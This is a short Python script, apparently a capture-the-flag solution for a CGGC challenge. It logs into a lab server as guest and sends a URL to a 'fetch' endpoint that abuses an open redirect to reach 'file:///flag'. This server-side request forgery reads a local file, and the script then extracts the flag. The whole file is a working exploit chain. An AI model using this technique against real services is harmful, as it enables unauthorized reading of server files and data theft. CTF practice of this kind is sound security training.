import requests

target = "http://10.99.66.5:10002/"

s = requests.session()

s.post(target+'login', data={
    "username":"guest",
    "password":"guest"
})

r = s.post(target+'fetch', data={
    "url":"http://previewsite/logout?next=file:///flag"
})

import re

print(re.findall(r"CGGC{.*?}", r.text)[0])

